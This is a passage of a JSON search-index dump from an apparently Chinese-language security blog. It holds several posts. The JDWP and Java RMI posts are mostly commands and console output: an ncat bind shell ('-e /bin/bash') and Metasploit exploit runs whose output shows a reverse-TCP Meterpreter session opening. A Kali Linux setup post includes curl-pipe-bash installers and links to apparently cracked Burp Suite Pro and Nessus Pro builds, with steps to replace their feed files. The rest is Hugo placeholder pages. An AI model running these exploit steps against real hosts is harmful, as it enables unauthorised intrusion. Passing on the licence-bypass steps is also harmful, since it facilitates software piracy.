\u0026quot;java.lang.String.indexOf\u0026quot; --cmd \u0026quot;ncat -v -l -p 7777 -e /bin/bash\u0026quot; 连接shell\nnc 10.184.67.1 7777 Metasploit利用 用msfconsole启动Metasploit，并且选用exploit/multi/misc/java_jdwp_debugger漏洞利用模块。\nModule options (exploit/multi/misc/java_jdwp_debugger): Name Current Setting Required Description ---- --------------- -------- ----------- RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS 10.184.67.1 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 2005 yes The target port (TCP) TMP_PATH no A directory where we can write files. Ensure there is a trailing slash Payload options (linux/x64/meterpreter/bind_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LPORT 4444 yes The listen port RHOST 10.184.67.1 no The target address 修复建议  关闭JDWP端口，或者JDWP端口不对公网开放 关闭Java的debug模式（开启该模式对服务器性能有影响）  ","description":"","id":116,"section":"en","tags":[""],"title":"JDWP","uri":"http://crkmythical.github.io/en/blog/jdwp/"},{"content":"RMI (Java Remote Method Invocation) Java 远程方法调用，是一种允许一个 JVM 上的 object 调用另一个 JVM 上 object 方法的机制。\nRMI 程序通常包括\n rmi registry naming service，提供 remote object 注册，name 到 remote object 的绑定和查询，是一种特殊的 remote object rmi server 创建 remote object，将其注册到 RMI registry rmi client 通过 name 向 RMI registry 获取 remote object reference (stub)，调用其方法  通常 RMI server 和 registry 运行在同一个 host 的不同端口上\n RMI Registry 默认运行在 1099 端口上\nRMI URL rmi://hostname:port/remoteObjectName\n 信息收集  误报较高\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  nmap -T4 -Pn -sV -p 11099,36753 --script rmi-vuln-classloader 10.200.19.52 Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:47 CST Nmap scan report for 10.200.19.52 Host is up (0.066s latency). PORT STATE SERVICE VERSION 11099/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | | References: |_ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb 36753/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | | References: |_ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds   Java RMI接口枚举 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  msf6 auxiliary(gather/java_rmi_registry) \u0026gt; show options Module options (auxiliary/gather/java_rmi_registry): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.200.19.52 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 11099 yes The target port (TCP) msf6 auxiliary(gather/java_rmi_registry) \u0026gt; run [*] Running module against 10.200.19.52 [*] 10.200.19.52:11099 - Sending RMI Header... [*] 10.200.19.52:11099 - Listing names in the Registry... [+] 10.200.19.52:11099 - 1 names found in the Registry [+] 10.200.19.52:11099 - Name jmxrmi (javax.management.remote.rmi.RMIServerImpl_Stub) found on 10.200.19.52:36753 [*] Auxiliary module execution completed   Java RMI代码执行扫描器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  msf6 auxiliary(scanner/misc/java_rmi_server) \u0026gt; show options Module options (auxiliary/scanner/misc/java_rmi_server): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.200.19.52 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 11099 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/misc/java_rmi_server) \u0026gt; run [+] 10.200.19.52:11099 - 10.200.19.52:11099 Java RMI Endpoint Detected: Class Loader Enabled [*] 10.200.19.52:11099 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   Java RMI默认配置导致的远程代码执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  msf6 exploit(multi/misc/java_rmi_server) \u0026gt; show options Module options (exploit/multi/misc/java_rmi_server): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 yes Time that the HTTP Server will wait for the payload request RHOSTS 192.168.79.28 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 36753 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 12.12.6.178 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port msf6 exploit(multi/misc/java_rmi_server) \u0026gt; run [*] Started reverse TCP handler on 12.12.6.178:4444 [*] 192.168.79.28:36753 - Using URL: http://0.0.0.0:8080/gXZLSG8BnMsa3B5 [*] 192.168.79.28:36753 - Local IP: http://192.168.79.28:8080/gXZLSG8BnMsa3B5 [*] 192.168.79.28:36753 - Server started. [-] 192.168.79.28:36753 - Exploit failed [unreachable]: RuntimeError The connection was refused by the remote host (192.168.79.28:36753). [*] 192.168.79.28:36753 - Server stopped. [*] Exploit completed, but no session was created.   Java RMIConnectionImpl浏览器反序列化提权 msf6 exploit(multi/misc/java_rmi_server) \u0026gt; show options Module options (exploit/multi/misc/java_rmi_server): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 yes Time that the HTTP Server will wait for the payload request RHOSTS 10.200.19.52 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 11099 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 12.12.6.178 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port msf6 exploit(multi/misc/java_rmi_server) \u0026gt; run [*] Started reverse TCP handler on 12.12.6.178:4444 [*] 10.200.19.52:11099 - Using URL: http://0.0.0.0:8080/oYpjH1vIBWgI4Ua [*] 10.200.19.52:11099 - Local IP: http://192.168.79.28:8080/oYpjH1vIBWgI4Ua [*] 10.200.19.52:11099 - Server started. [*] 10.200.19.52:11099 - Sending RMI Header... [*] 10.200.19.52:11099 - Sending RMI Call... [*] 10.200.19.52:11099 - Replied to request for payload JAR [*] Sending stage (53837 bytes) to 10.200.19.52 [+] Meterpreter sessin 1 opened (192.168.79.28:4444 -\u0026gt; 10.200.19.52:50836) at 2020-11-26 18:31:14 -0800 ","description":"","id":117,"section":"en","tags":[""],"title":"Java RMI","uri":"http://crkmythical.github.io/en/blog/java-rmi/"},{"content":"系统配置 设置root密码 1 2  sudo passwd root echo \u0026#34;$USERALL=(ALL:ALL) NOPASSWD: ALL\u0026#34; | sudo tee /etc/sudoers.d/dont-prompt-$USER-for-sudo-password # 执行root权限的命令   更改区域设置 1 2 3 4  sudo dpkg-reconfigure locales \u0026gt; - en_US.UTF-8 \u0026gt; - zh_CN.UTF-8   输入法\u0026amp;字体配置 1 2 3 4 5 6 7 8 9  wget https://ime.sogoucdn.com/dl/index/1605612770/sogoupinyin_2.4.0.2732_amd64.deb?st=dhRiak9ucl6k3GZibQ0Tfg\u0026amp;e=1605918428\u0026amp;fn=sogoupinyin_2.4.0.2732_amd64.deb # 下载搜狗输入法软件包 dpkg -i sougoupinyin.deb #安装输入法 dpkg --configure -a #软件包更新中断时的修复命令 dpkg -r sogoupinyin # 删除软件 dpkg -P sougoupinyin # 删除软件及配置文件 apt install zsh-theme-powerlevel9k # 安装zsh-theme-powerlevel9k字体   升级系统 1 2 3 4 5 6 7 8 9  echo \u0026#34;#deb http://http.kali.org/kali kali-rolling main non-free contrib deb http://mirrors.aliyum.com/kali kali-rolling main non-free contrib deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\u0026#34; | tee /etc/apt/sources.list #配置阿里和中科大源 apt update \u0026amp;\u0026amp; apt upgrade -y # 升级软件列表并更新软件 \\\u0026amp;\u0026amp; apt dist-upgrade -y # 升级系统 \\\u0026amp;\u0026amp; apt clean \u0026amp;\u0026amp; apt autoclean \u0026amp;\u0026amp; apt autoremove -y # 清除 已下载的软件包 和 旧软件包 dpkg -l |grep ^rc|awk \u0026#39;{print $2}\u0026#39; |sudo xargs dpkg -P # 清理系统残存配置   常见清理命令理解\n apt remove/autoremove 卸载软件 apt clean/autoclean 删除软件包    命令 作用     apt purge  删除软件,删除配置信息   apt remove  删除软件(保留配置信息)   apt autoremove 删除为了满足其他软件包的依赖而安装，但现在不再需要的软件包   apt autoclean 删除未安装在系统的软件包   apt clean 删除已安装的软件包(/var/cache/apt/archives内的软件包   apt install \u0026ndash;fix-broken /-f dpkg安装失败时修复依赖关系      安装/清理内核头文件 apt install linux-headers-$(uname -r) dpkg --get-selections | grep linux apt purge \u0026lt;kernel-name\u0026gt; \u0026lt;haders-name\u0026gt; UI优化   主题文件：/usr/share/themes/\n  图标文件：/usr/share/icons/\n  背景壁纸：/usr/share/background/\n  grub启动图片： /usr/share/images/desktop-bas\n login-background.png #进如系统界面的背景图 kali-grub.png　#grub的背景图片 kali-wallpaper_1024×786 #类似的都是桌面背景图    、/usr/share/wallpapers/\n  conky: /etc/conky/\n  终端优化  zsh优化  1 2 3 4 5 6 7 8 9 10 11 12 13  #oh-my-zsh sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; # 安装oh-my-zsh sed -i \u0026#39;s/robbyrussell/gnzh/g\u0026#39; .zshrc # 替换主题 git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions # 下载zsh-autosuggestions插件 git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting # 下载syntax-highling插件 git clone https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions # 下载zsh-completions sed -i \u0026#34;s/plugins.*/plugins=(git web-search autojump zsh-autosuggestions zsh-syntax-highlighting zsh-completions )/g\u0026#34; .zshrc # 配置插件 apt install autojump # 安装autojump curl -fsSL https://starship.rs/install.sh | bash #下载prompt-starship echo \u0026#34;ZXZhbCAiJChzdGFyc2hpcCBpbml0IGJhc2gpIgo=\u0026#34; | base64 -d \u0026gt;\u0026gt;~/.zshrc # 添加eval \u0026#34;$(starship init bash)\u0026#34; 到.zshrc rm \u0026#34;$(which starship)\u0026#34; # Locate and delete the starship binary #opt: zsh欢迎语 echo \u0026#34;CiMgenNoIHdlbGNvbWUgYmFubmVyIQpmaWdsZXQgImFza0RpbmciCmVjaG8gLW5lICJUb2RheSBpczpcdFx0JHtyZWR9IiBgZGF0ZWAgO2VjaG8gIiIgI2Rpc3BsYXkgY3VycmVudCB0aW1lCmVjaG8gLW5lICIke2xpZ2h0Z3JlZW59S2VybmVsIEluZm9ybWF0aW9uOiBcdCR7cmVkfSIgYHVuYW1lIC1zbXJgICNkaXNwbGF5IHN5c3RlbSBpbmZvcm1hdGlvbgoK\u0026#34;| base64 -d \u0026gt;\u0026gt; .zshrc \u0026amp;\u0026amp; source .zshrc # 设置zsh欢迎语并立即生效   vim/neovim优化  1  curl -sLf https://spacevim.org/install.sh | bash   tmux优化  1 2 3  git clone https://github.com/gpakosz/.tmux.git ~/.tmux \u0026amp;\u0026amp;\\ ln -s -f .tmux/.tmux.conf \u0026amp;\u0026amp;\\ cp .tmux/.tmux.conf.local . # tmux   eDux-ui终端   https://github.com/GitSquared/edex-ui\n 其他优化 永久开启IP转发功能 1 2 3  echo \u0026#34;net.ipv4.ip_forward=1\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf echo 1 \u0026gt; /proc/sys/net/ipv6/conf/all/forwarding   右键文件编码转换 系统服务配置 PostgreSQL服务 1 2  systemctl start postgresql.service systemctl enable postgresql   设置 SSH 通过密钥登录 分为服务器sshd文件配置和本地客户端配置\n\u0026lt;1\u0026gt;VPS上sshd配置  在vps上生成rsa密钥,并为私钥添加passphrase,  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [root@～]# ssh-keygen -t rsa #生成rsa密钥 Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory \u0026#39;/root/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): #设置密钥短语 Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:9k3RJ8EpR63FIK5PSkCdujrIoP1gmkokxcDuCfV+eoI root@kali The key\u0026#39;s randomart image is: +---[RSA 3072]----+ |o .. ..o+= | | +. . o..o+.+| |..o. .. oooo.| |.o . .. . ..o | |+... S.o o | |oo. . ...o * | | +o+ + . o o | |o+E.= + | |= ..o . | +----[SHA256]-----+   把公钥文件写入到 ~/.ssh/authorized_keys  1  [root@～]# cat .ssh/id_rsa.pub \u0026gt;\u0026gt; .ssh/authorized_keys #添加公钥到授权文件   更改.ssh目录及文件权限  1 2 3 4  [root@local]# chmod 700 .ssh \u0026amp;\u0026amp;\\ chmod 600 .ssh/id_rsa.pub .ssh/authorized_keys \u0026amp;\u0026amp;\\ \tchmod 400 .ssh/id_rsa #设置.ssh目录权限   修改/etc/ssh/sshd_config文件  1 2 3 4 5 6 7 8 9 10 11 12 13 14  sed -i \u0026#34;s/#Port.*/Port 2020/g\u0026#34; /etc/ssh/sshd_config #修改端口为2020 sed -i \u0026#34;s/#PermitRootLogin.*/PermitRootLogin yes/g\u0026#34; /etc/ssh/sshd_config #允许root登陆 sed -i \u0026#34;38a\\RSAAuthentication yes\u0026#34; /etc/ssh/sshd_config #使用RSA认证 sed -i \u0026#34;s/^#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\\/authorized_keys/g\u0026#34; /etc/ssh/sshd_config #启用authorized_keys文件 sed -i \u0026#34;s/^PasswordAuthentication.*/PasswordAuthentication no/g\u0026#34; /etc/ssh/sshd_config #关闭密码认证 可选:建立隧道 sed -i \u0026#34;s/#AllowTcpForwarding yes/AllowTcpForwarding yes/g\u0026#34; /etc/ssh/sshd_config #启用tcp转发 sed -i \u0026#34;s/#TCPKeepAlive yes/TCPKeepAlive yes/g\u0026#34; /etc/ssh/sshd_config #防止死连接   设置开机自启动服务  1  [root@～]# systemctl restart ssh \u0026amp;\u0026amp; systemctl enable ssh   \u0026lt;2\u0026gt;本地配置 拷贝私钥到本地电脑为id_rsa.vps\n1  [root@～]# ssh -i .ssh/id_rsa.vps root@172.16.41.4 -p 2020   软件安装 渗透测试软件 [BurpSuite Professional]  https://pan.baidu.com/s/1klNoVJdPxVdanAbiJBT4kg 密码: mpnk\n  Project options \u0026gt; Misc \u0026gt; Embedded Browser\n 1 2 3 4 5 6  apt purge burpsuite # 清除系统自带社区版 apt-mark hold burpsuite # 禁止burpsuite自动安装/升级/卸载 echo \u0026#34;W0Rlc2t0b3AgRW50cnldCk5hbWU9QnVycFN1aXRlIFByb2Zlc3Npb25hbApFbmNvZGluZz1VVEYtOApFeGVjPSBzaCAtYyAiY2QgL29wdC9idXJwc3VpdGVfcHJvOyBqYXZhIC1qYXIgL29wdC9idXJwc3VpdGVfcHJvL0J1cnBTdWl0ZUxvYWRlci5qYXIiCkljb249a2FsaS1idXJwc3VpdGUKU3RhcnR1cE5vdGlmeT1mYWxzZQpUZXJtaW5hbD1mYWxzZQpUeXBlPUFwcGxpY2F0aW9uCkNhdGVnb3JpZXM9MDMtd2ViYXBwLWFuYWx5c2lzOzAzLTA2LXdlYi1hcHBsaWNhdGlvbi1wcm94aWVzOwpYLUthbGktUGFja2FnZT1idXJwc3VpdGU=\u0026#34; | base64 -d | tee /usr/share/applications/kali-burpsuite.desktop # 配置BurpSuite启动器链接，启动路径为Exec= sh -c \u0026#34;cd /opt/burpsuite_pro; java -jar /opt/burpsuite_pro/BurpSuiteLoader.jari\u0026#34; chattr +i /usr/share/applications/kali-burpsuite.desktop # 防止升级时被删除或修改   [Nessus Professional]  链接: https://pan.baidu.com/s/1RkXQE5XkeBGHlgWK42pArA 密码: c07r\n  安装  1 2  dpkg -i Nessus-8.12.1-debian6_amd64.deb # 安装Nessus软件 systemctl start nessusd.service # 启动nessud服务    访问https://localhost:8834/ 选择 Managed Scanner 然后 tenable.SC 最后创建 user with password 并登陆 升级插件库并替换plugin_feed_info.inc文件  1 2 3 4 5 6 7  systemctl stop nessusd.service # 关闭nessud服务 /opt/nessus/sbin/nessuscli update /root/Desktop/all-2.0.tar.gz # 升级插件库 cp /root/Desktop/plugin_feed_info.inc /opt/nessus/var/nessus/plugin_feed_info.inc # 替换plugin_feed_info.inc cp /root/Desktop/plugin_feed_info.inc /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc # 替换plugin_feed_info.inc systemctl start nessusd.service # 启动nessud服务   常用软件 码字神器Typora 1 2 3 4 5 6 7 8 9 10 11 12 13  # sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add - # add Typora\u0026#39;s repository sudo add-apt-repository \u0026#39;deb https://typora.io/linux ./\u0026#39; sudo apt-get update # install typora sudo apt-get install typora   码字神器Joplin 1  apt install joplin /joplin-cli   或者\n1 2 3 4 5  apt install nodejs npm npm config set registry https://registry.npm.taobao.org echo -e \u0026#34;\\n#Jopling configure\\nNPM_CONFIG_PREFIX=~/.joplin-bin\\n\u0026#34; \u0026gt;\u0026gt; ~/.zshrc npm install -g joplin ln -s ~/.joplin-bin/bin/joplin /usr/bin/joplin   办公神器WPS 1 2 3  wget https://wdl1.cache.wps.cn/wps/download/ep/Linux2019/9719/wps-office_11.1.0.9719_amd64.deb # 下载wps-office软件 dpkg -i wps-office_11.1.0.9719_amd64.deb   代码差异分析神器diff-so-fancy 1  git clone https://github.com/so-fancy/diff-so-fancy.git   远程连接神器Remmina 1  apt install remmina   代理Proxy软件v2rayL  v2aryL  1  bash \u0026lt;(curl -s -L http://dl.thinker.ink/install.sh)    clash   https://github.com/Dreamacro/clash/releases\n 1 2 3  tar -zxvf clash-linux-amd64-v1.3.0.gz mv clash-linux-amd64-v1.3.0 /usr/local/bin/clash chmod +x /usr/local/bin/clash   文件互传神器croc 1  curl https://getcroc.schollz.com | bash   图形化hex编辑器 1  apt install bless   系统优化\u0026amp;监视器  stacer  1  apt install stacer    bashtop  1 2 3  git clone https://github.com/aristocratos/bashtop.git \u0026amp;\u0026amp;\\ cd bashtop \u0026amp;\u0026amp; \\ sudo make install   Gif录屏工具peek 1  apt install peek   自动化配置脚本-后续整理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147  echo \u0026#34;\u0026#34; echo \u0026#34;==========================================================================\u0026#34; echo \u0026#34;= Kali Auto Init Tool =\u0026#34; echo \u0026#34;= Powered by Mr.Framework =\u0026#34; echo \u0026#34;= https://askding.github.io =\u0026#34; echo \u0026#34;==========================================================================\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[*] 即将自动对kali进行基本配置，建议你根据需要修改脚本。安装配置过程可能需要一会儿，并且由你的网速决定....\u0026#34; read -p \u0026#34;[*] 请按任意键继续....\u0026#34; echo \u0026#34;[+] 添加kali源\u0026#34; apt-key adv --recv ED444FF07D8D0BF6 echo \u0026#34;deb http://http.kali.org/kali kali-rolling main non-free contrib\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list echo \u0026#34;deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list echo \u0026#34;deb http://mirrors.aliyun.com/debian stable main contrib non-free\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list echo \u0026#34;[ok] 添加kali源成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 添加一个普通用户\u0026#34; read -p \u0026#34;请输入用户名: \u0026#34; username useradd -m -G sudo,video,audio,cdrom -s /bin/bash $username echo \u0026#34;请设置用户密码：\u0026#34; passwd $username echo \u0026#34;[ok] 添加普通用户成功！\u0026#34; echo \u0026#34;\u0026#34; # 安装内核头文件 echo \u0026#34;[+] 安装内核头文件... \u0026#34; apt-get -y install linux-headers-$(uname -r) echo \u0026#34;\u0026#34; echo \u0026#34;[ok] 内核头文件安装成功！\u0026#34; echo \u0026#34;\u0026#34; # 解决kali启动时静音问题 echo \u0026#34;[+] 安装 alsa-utils 解决kali启动时静音问题\u0026#34; apt-get -y install alsa-utils echo \u0026#34;[ok] 安装 alsa-utils 成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 添加PPPoE拨号连接功能\u0026#34; apt-get install pppoe pppoeconf echo \u0026#34;[ok] 安装PPPoE成功!\u0026#34; echo \u0026#34; \u0026gt;\u0026gt; 你可以使用 nm-connection-editor 命令管理pppoe连接\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 添加VPN支持: PPTP IPsec/IKEv2 vpnc network-manager-ssh\u0026#34; apt-get -y install network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome network-manager-ssh echo \u0026#34;[ok] 成功添加vpn支持!\u0026#34; echo \u0026#34;\u0026#34; # Base Tool echo \u0026#34;[+] 安装一些必备系统工具：谷歌拼音输入法、垃圾清理工具、截图工具、快速启动工具、软件包管理工具等\u0026#34; apt-get -y install fcitx fcitx-googlepinyin flameshot bleachbit gdebi synaptic synapse catfish scrot vokoscreen chromium echo \u0026#34;[ok] 成功安装系统必备软件!\u0026#34; echo \u0026#34;\u0026#34; # Server Tools echo \u0026#34;[+] 安装服务器连接管理工具：remmina、filezilla\u0026#34; apt-get -y install remmina filezilla echo \u0026#34;[ok] 安装服务器连接管理工具成功!\u0026#34; echo \u0026#34;\u0026#34; # 美化 echo \u0026#34;[+] 设置窗口按钮到左侧\u0026#34; gsettings set org.gnome.desktop.wm.preferences button-layout \u0026#39;close,maximize,minimize:\u0026#39; echo \u0026#34;[ok] 设置窗口按钮到左侧成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装中文字体\u0026#34; apt-get -y install fonts-wqy-microhei fonts-wqy-zenhei echo \u0026#34;[ok] 安装中文字体成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装基本美化工具\u0026#34; apt-get -y install zsh screenfetch neofetch figlet peek #apt-get -y install cairo-dock echo \u0026#34;[ok] 安装成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 删除无用主题\u0026#34; cd /usr/share/themes/ \u0026amp;\u0026amp; rm -rf Albatross Blackbird Bluebird HighContrast Greybird* echo \u0026#34;[ok] 删除成功！\u0026#34; # Security Tools echo \u0026#34;[+] 安装图形化十六进制编辑器bless\u0026#34; apt-get -y install bless echo \u0026#34;[ok] 安装成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装firewalld防火墙及iptables图形化管理工具gufw \u0026#34; apt-get -y install gufw firewalld firewall-applet #systemctl enable firewalld.service echo \u0026#34;[ok] 安装成功！\u0026#34; echo \u0026#34;\u0026#34; # Install sublime text 3 echo \u0026#34;[+] 安装sublime text 3，速度可能会比较慢\u0026#34; wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - sudo apt-get install apt-transport-https echo \u0026#34;deb https://download.sublimetext.com/ apt/stable/\u0026#34; | sudo tee /etc/apt/sources.list.d/sublime-text.list apt-get update apt-get install sublime-text echo \u0026#34;[+] 解决sublime-text 中文输入问题\u0026#34; git clone https://github.com/lyfeyaj/sublime-text-imfix.git cd sublime-text-imfix cp ./lib/libsublime-imfix.so /opt/sublime_text/ \u0026amp;\u0026amp; cp ./src/subl /usr/bin/ echo \u0026#34;[ok] 修复成功。输入subl命令启动sublime text即可输入中文！\u0026#34; echo \u0026#34;\u0026#34; # Install typora echo \u0026#34;[+] 安装 typora，速度可能会比较慢\u0026#34; sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE echo \u0026#34;deb http://typora.io linux/\u0026#34; | sudo tee /etc/apt/sources.list.d/typora.list sudo apt-get update -y sudo apt-get install typora echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装 node npm\u0026#34; wget https://npm.taobao.org/mirrors/node/v8.9.3/node-v8.9.3.tar.gz tar zxvf node-v8.9.3.tar.gz \u0026amp;\u0026amp; mv node-v8.9.3-linux-x64 /opt ln -s /opt/node-v8.9.3-linux-x64/bin/node /usr/local/bin/node ln -s /opt/node-v8.9.3-linux-x64/bin/npm /usr/local/bin/npm rm ~/node-v8.9.3.tar.gz echo \u0026#34;\u0026#34; echo \u0026#34;[+] 清除垃圾 ......\u0026#34; apt-get clean \u0026amp;\u0026amp; apt-get autoclean \u0026amp;\u0026amp; apt-get autoremove -y　echo \u0026#34;[+] Cleaning OK!\u0026#34; # Install oh-my-zsh # 普通用户就以普通权限安装 apt-get install zsh echo \u0026#34;[+] Install oh-my-zsh\u0026#34; sh -c \u0026#34;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026#34; echo \u0026#34; Setting oh-my-zsh be the default terminal\u0026#34; chsh -s /bin/zsh echo \u0026#34;\u0026#34; neofetch echo \u0026#34;[OK] 所有任务完成!\u0026#34;   ","description":"","id":118,"section":"en","tags":["system"],"title":"kali inux系统优化","uri":"http://crkmythical.github.io/en/blog/kali-inux%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/"},{"content":"Markdown here\n","description":"test post","id":119,"section":"en","tags":null,"title":"Related content","uri":"http://crkmythical.github.io/en/devsecops/relatedcontent/"},{"content":"Markdown here\n","description":"test post","id":120,"section":"en","tags":null,"title":"Page Resources","uri":"http://crkmythical.github.io/en/devsecops/pageresources/"},{"content":"Markdown here\n","description":"test post","id":121,"section":"en","tags":null,"title":"Page Bundles","uri":"http://crkmythical.github.io/en/devsecops/pagebundles/"},{"content":"Markdown here\n","description":"test post","id":122,"section":"en","tags":null,"title":"Content Formats","uri":"http://crkmythical.github.io/en/devsecops/contentfortmats/"},{"content":"Markdown here\n","description":"test post","id":123,"section":"en","tags":null,"title":"Image Processing","uri":"http://crkmythical.github.io/en/devsecops/imageprocessing/"},{"content":"Markdown here\n","description":"test post","id":124,"section":"en","tags":null,"title":"Shortcodes","uri":"http://crkmythical.github.io/en/devsecops/contentmanagement/shortcodes/"},{"content":"Markdown here\n","description":"test post","id":125,"section":"en","tags":null,"title":"Frontmatter","uri":"http://crkmythical.github.io/en/devsecops/contentmanagement/frontmatter/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nThis article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\n Headings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  